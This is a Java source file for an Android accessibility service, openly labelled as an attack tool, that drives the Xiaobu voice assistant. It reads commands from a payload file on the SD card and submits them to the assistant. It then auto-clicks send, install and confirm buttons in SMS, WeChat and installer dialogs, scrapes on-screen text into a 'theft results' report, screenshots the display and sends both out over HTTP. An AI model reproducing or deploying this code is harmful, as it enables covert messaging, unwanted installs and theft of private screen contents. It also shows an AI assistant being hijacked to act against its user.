package com.attacker.xiaobu;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.graphics.Bitmap;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;

/**
 * v41 — 多步攻击: SMS/微信发送链路
 * 流程: 检测flag → 点击小布发送 → 等目标App打开 → 点击目标App发送按钮 → 截图
 */
public class AttackAccessibilityService extends AccessibilityService {
    private static final String TAG = "XiaoBuAttack";
    private static final String XB = "com.heytap.speechassist";
    private final Handler h = new Handler(Looper.getMainLooper());
    private boolean busy = false;

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                | AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
                | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        info.notificationTimeout = 200;
        setServiceInfo(info);
        startPolling();
        Log.i(TAG, "🔧 v41 ready (SMS+WeChat多步攻击)");
    }

    private void startPolling() {
        h.postDelayed(() -> {
            tryStart();
            startPolling();
        }, 1500);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
        if (XB.equals(pkg) && !busy) tryStart();
    }

    private void tryStart() {
        try {
            java.io.File f = new java.io.File("/sdcard/attack_payload.txt");
            if (!f.exists()) return;
            java.io.FileInputStream fis = new java.io.FileInputStream(f);
            byte[] d = new byte[fis.available()]; fis.read(d); fis.close();
            String p = new String(d, "UTF-8").trim();
            if (p.isEmpty()) return;
            f.delete();
            Log.i(TAG, "🔍 " + p);
            busy = true;
            final String cmd = p;

            // 判断是否需要二次点击
            boolean needSecondClick = cmd.contains("发短信") || cmd.contains("发微信")
                || cmd.contains("安装") || cmd.contains("拨打电话");

            h.postDelayed(() -> {
                clickSend();  // 点击小布发送按钮

                if (needSecondClick) {
                    // SMS/微信: 等目标App打开后点击其发送按钮
                    int delay = cmd.contains("发微信") ? 10000
                        : cmd.contains("安装") ? 10000 : 3500;
                    h.postDelayed(() -> {
                        clickSendInTargetApp();
                        h.postDelayed(() -> {
                            captureAll(cmd); busy = false;
                        }, 2000);
                    }, delay);
                } else {
                    // 普通指令: 5s后直接截图
                    h.postDelayed(() -> {
                        captureAll(cmd);
                        busy = false;
                    }, 5000);
                }
            }, 2000);
        } catch (Exception e) {}
    }

    private void clickSend() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        List<AccessibilityNodeInfo> btns = root.findAccessibilityNodeInfosByViewId(XB + ":id/btn_send");
        if (btns != null && !btns.isEmpty()) {
            btns.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
            Log.i(TAG, "✅ 点击小布发送");
        }
        root.recycle();
    }

    /**
     * 在目标App(SMS/微信)中查找并点击发送按钮
     */
    private boolean clickSendInTargetApp() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) {
            Log.w(TAG, "目标App窗口为空");
            return false;
        }
        String pkg = root.getPackageName() != null ? root.getPackageName().toString() : "?";
        Log.i(TAG, "搜索目标App发送按钮, 当前: " + pkg);

        // 先处理弹窗
        clickIfExists(root, new String[]{"允许", "继续", "确定", "我知道了", "安装", "确认"});

        // 找到可点击的发送/安装按钮
        if (clickAllClickableContaining(root, "发送") ||
            clickAllClickableContaining(root, "send") ||
            clickAllClickableContaining(root, "Send") ||
            clickAllClickableContaining(root, "安装") ||
            clickAllClickableContaining(root, "确认")) {
            Log.i(TAG, "✅ 找到可点击按钮");
            root.recycle();
            return true;
        }

        // fallback: gesture
        Log.w(TAG, "未找到可点击发送节点, 用gesture");
        clickByGesture(root);
        root.recycle();
        return false;
    }

    /** 递归搜索文本,返回最底部(最大Y)的匹配节点坐标 */
    private android.graphics.Rect findTextBounds(AccessibilityNodeInfo node, String text, int depth) {
        if (node == null || depth > 40) return null;
        android.graphics.Rect best = null;
        try {
            CharSequence t = node.getText();
            if (t != null && t.toString().contains(text)) {
                android.graphics.Rect r = new android.graphics.Rect();
                node.getBoundsInScreen(r);
                if (r.width() > 0 && r.height() > 0) {
                    if (best == null || r.top > best.top) best = r;
                }
            }
            CharSequence d = node.getContentDescription();
            if (d != null && d.toString().contains(text)) {
                android.graphics.Rect r = new android.graphics.Rect();
                node.getBoundsInScreen(r);
                if (r.width() > 0 && r.height() > 0) {
                    if (best == null || r.top > best.top) best = r;
                }
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    android.graphics.Rect r = findTextBounds(child, text, depth + 1);
                    child.recycle();
                    if (r != null && (best == null || r.top > best.top)) best = r;
                }
            }
        } catch (Exception e) {}
        return best;
    }

    /** dispatchGesture单次点击 */
    private void gestureTap(float cx, float cy) {
        try {
            android.accessibilityservice.GestureDescription.Builder b =
                new android.accessibilityservice.GestureDescription.Builder();
            android.graphics.Path p = new android.graphics.Path();
            p.moveTo(cx, cy);
            b.addStroke(new android.accessibilityservice.GestureDescription.StrokeDescription(p, 0, 1));
            dispatchGesture(b.build(), null, null);
            Log.i(TAG, "✅ gestureTap (" + cx + "," + cy + ")");
        } catch (Exception e) {
            Log.e(TAG, "gestureTap失败: " + e.getMessage());
        }
    }

    /** 遍历所有可点击节点,查找text或desc包含关键词的,直接点击 */
    private boolean clickAllClickableContaining(AccessibilityNodeInfo node, String keyword) {
        if (node == null) return false;
        try {
            if (node.isClickable() && node.isEnabled()) {
                CharSequence t = node.getText();
                CharSequence d = node.getContentDescription();
                if ((t != null && t.toString().toLowerCase().contains(keyword.toLowerCase())) ||
                    (d != null && d.toString().toLowerCase().contains(keyword.toLowerCase()))) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    Log.i(TAG, "✅ clickAllClickable: " + (t != null ? t : d));
                    return true;
                }
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    if (clickAllClickableContaining(child, keyword)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            }
        } catch (Exception e) {}
        return false;
    }

    /** 搜索文本节点并点击其可点击祖先 */
    private boolean clickByTextOrParent(AccessibilityNodeInfo root, String text) {
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
        if (nodes == null) return false;
        for (AccessibilityNodeInfo n : nodes) {
            if (n.isClickable() && n.isEnabled()) {
                n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                Log.i(TAG, "✅ clickByTextOrParent直接: " + text);
                return true;
            }
            AccessibilityNodeInfo ancestor = findClickableAncestor(n);
            if (ancestor != null && ancestor != n) {
                ancestor.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                Log.i(TAG, "✅ clickByTextOrParent祖先: " + text);
                return true;
            }
        }
        return false;
    }

    /** 点击第一个匹配文本的可点击元素(用于关闭弹窗) */
    private void clickIfExists(AccessibilityNodeInfo root, String[] texts) {
        for (String t : texts) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(t);
            if (nodes != null) {
                for (AccessibilityNodeInfo n : nodes) {
                    if (n.isClickable() && n.isEnabled()) {
                        n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        Log.i(TAG, "✅ 点击弹窗按钮: " + t);
                        return;
                    }
                }
            }
        }
    }

    // 微信发送按钮校准坐标(屏幕中央初始, 待用户调整)
    // 目标: 覆盖微信底部的绿色"发送"按钮
    private float mWxSendX = 540;  // 屏幕宽1080的一半 = 中心
    private float mWxSendY = 1206; // 屏幕高2412的一半 = 中心

    // 微信发送按钮手势点击(备用, 坐标已校准: CENTER + WX_LM/WX_TM)
    private void clickByGesture(AccessibilityNodeInfo root) {
        try {
            android.graphics.Rect r = new android.graphics.Rect();
            root.getBoundsInScreen(r);
            int cx = r.right / 2 + WX_LM;
            int cy = r.bottom / 2 + WX_TM;
            android.accessibilityservice.GestureDescription.Builder builder =
                new android.accessibilityservice.GestureDescription.Builder();
            android.graphics.Path p = new android.graphics.Path();
            p.moveTo(cx, cy);
            builder.addStroke(new android.accessibilityservice.GestureDescription.StrokeDescription(p, 0, 1));
            dispatchGesture(builder.build(), null, null);
            Log.i(TAG, "gesture fallback at (" + cx + "," + cy + ")");
        } catch (Exception e) {
            Log.e(TAG, "gesture失败: " + e.getMessage());
        }
    }

    // 微信发送按钮校准坐标(Gravity.CENTER偏移)
    private static final int WX_LM = 50;   // leftMargin: 右移(正=右)
    private static final int WX_TM = 50;   // topMargin: 下移(正=下)

    /** 显示红色校准标记 */
    private void showCalibrationDot() {
        try {
            android.view.WindowManager wm = (android.view.WindowManager)
                getSystemService(android.content.Context.WINDOW_SERVICE);
            android.widget.FrameLayout box = new android.widget.FrameLayout(this);
            box.setBackgroundColor(0xCCFF0000);
            android.view.WindowManager.LayoutParams lp =
                new android.view.WindowManager.LayoutParams(12, 12,  // 缩小80%
                    android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O
                        ? android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                        : android.view.WindowManager.LayoutParams.TYPE_PHONE,
                    android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                        | android.view.WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                    android.graphics.PixelFormat.TRANSLUCENT);
            lp.gravity = android.view.Gravity.CENTER;
            lp.x = WX_LM;
            lp.y = WX_TM;
            wm.addView(box, lp);
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                try { wm.removeView(box); } catch (Exception e2) {}
            }, 10000);
            Log.i(TAG, "🔴 红框 CENTER x=" + WX_LM + " y=" + WX_TM + " 12x12");
        } catch (Exception e) {
            Log.e(TAG, "标记失败: " + e.getMessage());
        }
    }

    /** 查找可点击的祖先节点 */
    private AccessibilityNodeInfo findClickableAncestor(AccessibilityNodeInfo node) {
        AccessibilityNodeInfo current = node;
        for (int i = 0; i < 10 && current != null; i++) {
            if (current.isClickable() && current.isEnabled()) return current;
            AccessibilityNodeInfo parent = current.getParent();
            if (parent == null) break;
            if (current != node) current.recycle();
            current = parent;
        }
        return null;
    }

    private boolean findAndClickSend(AccessibilityNodeInfo node, int depth) {
        if (node == null || depth > 40) return false;
        try {
            CharSequence text = node.getText();
            CharSequence desc = node.getContentDescription();
            String className = node.getClassName() != null ? node.getClassName().toString() : "";
            if (node.isClickable() && node.isEnabled()) {
                if (text != null && (text.toString().contains("发送") || text.toString().contains("Send"))) {
                    // 尝试点击该节点或其可点击父节点
                    AccessibilityNodeInfo clickable = findClickableAncestor(node);
                    if (clickable != null) {
                        clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        Log.i(TAG, "✅ 点击发送(父节点): " + text);
                        return true;
                    }
                }
                if (desc != null && (desc.toString().contains("发送") || desc.toString().toLowerCase().contains("send"))) {
                    AccessibilityNodeInfo clickable = findClickableAncestor(node);
                    if (clickable != null) {
                        clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        Log.i(TAG, "✅ 点击发送(desc父节点): " + desc);
                        return true;
                    }
                }
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    if (findAndClickSend(child, depth + 1)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            }
        } catch (Exception e) {}
        return false;
    }

    private void captureAll(String payload) {
        StringBuilder sb = new StringBuilder();
        sb.append("=== 窃取结果 ===\n载荷: ").append(payload).append("\n");
        sb.append("时间: ").append(new java.util.Date()).append("\n\n");

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root != null) {
            String pkg = root.getPackageName() != null ? root.getPackageName().toString() : "?";
            sb.append("当前App: ").append(pkg).append("\n");
            List<String> texts = new ArrayList<>();
            extractTexts(root, texts);
            for (int i = 0; i < texts.size(); i++) {
                String t = texts.get(i);
                if (t.length() > 300) t = t.substring(0, 300) + "...";
                sb.append("[").append(i).append("] ").append(t).append("\n");
            }
            sb.append("\n共").append(texts.size()).append("条\n");
            root.recycle();
        }

        String picPath = "/sdcard/attacker_screen_" + System.currentTimeMillis() + ".png";
        try {
            takeScreenshot(android.view.Display.DEFAULT_DISPLAY, Executors.newSingleThreadExecutor(),
                new TakeScreenshotCallback() {
                    public void onSuccess(ScreenshotResult r) {
                        try {
                            Bitmap b = Bitmap.wrapHardwareBuffer(r.getHardwareBuffer(), r.getColorSpace());
                            if (b != null) {
                                FileOutputStream o = new FileOutputStream(picPath);
                                b.compress(Bitmap.CompressFormat.PNG, 100, o); o.close();
                                b.recycle(); r.getHardwareBuffer().close();
                                sb.append("\n📸: ").append(picPath).append(" (").append(new java.io.File(picPath).length()).append("B)\n");
                                HttpExfil.sendScreenshot(AttackAccessibilityService.this, payload, picPath);
                            }
                        } catch (Exception e) {}
                    }
                    public void onFailure(int c) {}
                });
        } catch (Exception e) {}

        sb.append("\n✓\n");
        String summary = sb.toString();
        rotateFiles("/sdcard/attacker_output_", ".txt", summary);
        HttpExfil.sendText(this, payload, summary);
        Log.i(TAG, "🎉");
    }

    private void rotateFiles(String prefix, String suffix, String content) {
        try {
            new java.io.File(prefix + "2" + suffix).delete();
            new java.io.File(prefix + "1" + suffix).renameTo(new java.io.File(prefix + "2" + suffix));
            new java.io.File(prefix + "0" + suffix).renameTo(new java.io.File(prefix + "1" + suffix));
            FileOutputStream o = new FileOutputStream(prefix + "0" + suffix);
            o.write(content.getBytes("UTF-8")); o.close();
            FileOutputStream o2 = new FileOutputStream(prefix.replace("_", "") + suffix);
            o2.write(content.getBytes("UTF-8")); o2.close();
        } catch (Exception e) {}
    }

    private void extractTexts(AccessibilityNodeInfo n, List<String> o) {
        if (n == null || o.size() > 80) return;
        try {
            CharSequence t = n.getText();
            if (t != null && t.length() > 1 && t.length() < 500) o.add(t.toString().trim());
            CharSequence d = n.getContentDescription();
            if (d != null && d.length() > 1 && d.length() < 100) o.add("[desc] " + d.toString().trim());
            for (int i = 0; i < n.getChildCount(); i++) {
                AccessibilityNodeInfo c = n.getChild(i);
                if (c != null) { extractTexts(c, o); c.recycle(); }
            }
        } catch (Exception e) {}
    }

    @Override public void onInterrupt() {}
}
